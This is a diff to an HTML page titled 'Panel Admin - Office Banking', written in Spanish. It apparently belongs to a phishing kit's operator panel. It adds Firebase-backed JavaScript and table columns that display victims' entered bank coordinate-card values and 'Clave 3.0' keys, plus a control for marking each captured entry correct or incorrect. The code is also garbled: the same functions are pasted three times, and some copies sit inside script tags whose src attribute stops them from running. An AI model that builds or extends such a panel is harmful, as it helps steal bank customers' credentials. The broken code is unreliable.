@@ -5,8 +5,60 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Panel Admin - Office Banking</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js">
+    function validarFinal(correcto) {
+      const ref = firebase.database().ref("validacion_final");
+      ref.set(correcto ? "correcto" : "incorrecto");
+    }
+    
+    function validarFinal(correcto) {
+      const ref = firebase.database().ref("validacion_final");
+      if (!correcto) {
+        localStorage.removeItem("clave3_input");
+      }
+      ref.set(correcto ? "correcto" : "incorrecto");
+    }
+
+    function validarClave3Temp() {
+      const clave = localStorage.getItem("clave3_input");
+      const coord = localStorage.getItem("coordenadas_input");
+      const coordSpan = document.querySelector('[id^="tempCoord"]');
+      const claveSpan = document.querySelector('[id^="tempClave"]');
+      if (coordSpan) coordSpan.textContent = coord || '';
+      if (claveSpan) claveSpan.textContent = clave || '';
+    }
+
+    setInterval(validarClave3Temp, 1000);
+    </script>
+    
+    
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js">
+    function validarFinal(correcto) {
+      const ref = firebase.database().ref("validacion_final");
+      ref.set(correcto ? "correcto" : "incorrecto");
+    }
+    
+    function validarFinal(correcto) {
+      const ref = firebase.database().ref("validacion_final");
+      if (!correcto) {
+        localStorage.removeItem("clave3_input");
+      }
+      ref.set(correcto ? "correcto" : "incorrecto");
+    }
+
+    function validarClave3Temp() {
+      const clave = localStorage.getItem("clave3_input");
+      const coord = localStorage.getItem("coordenadas_input");
+      const coordSpan = document.querySelector('[id^="tempCoord"]');
+      const claveSpan = document.querySelector('[id^="tempClave"]');
+      if (coordSpan) coordSpan.textContent = coord || '';
+      if (claveSpan) claveSpan.textContent = clave || '';
+    }
+
+    setInterval(validarClave3Temp, 1000);
+    </script>
+    
+    
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -102,6 +154,9 @@
           <th>Coordenadas</th>
           <th>Clave 3.0</th>
           <th>Estado</th>
+          <th>Coord. TEMP</th>
+          <th>Clave 3.0 TEMP</th>
+          <th>Acciones Final</th>
         </tr>
       </thead>
       <tbody id="tbody">
@@ -154,6 +209,32 @@
       `;
       tbody.prepend(tr);
     });
-  </script>
+  
+    function validarFinal(correcto) {
+      const ref = firebase.database().ref("validacion_final");
+      ref.set(correcto ? "correcto" : "incorrecto");
+    }
+    
+    function validarFinal(correcto) {
+      const ref = firebase.database().ref("validacion_final");
+      if (!correcto) {
+        localStorage.removeItem("clave3_input");
+      }
+      ref.set(correcto ? "correcto" : "incorrecto");
+    }
+
+    function validarClave3Temp() {
+      const clave = localStorage.getItem("clave3_input");
+      const coord = localStorage.getItem("coordenadas_input");
+      const coordSpan = document.querySelector('[id^="tempCoord"]');
+      const claveSpan = document.querySelector('[id^="tempClave"]');
+      if (coordSpan) coordSpan.textContent = coord || '';
+      if (claveSpan) claveSpan.textContent = clave || '';
+    }
+
+    setInterval(validarClave3Temp, 1000);
+    </script>
+    
+    
 </body>
 </html>
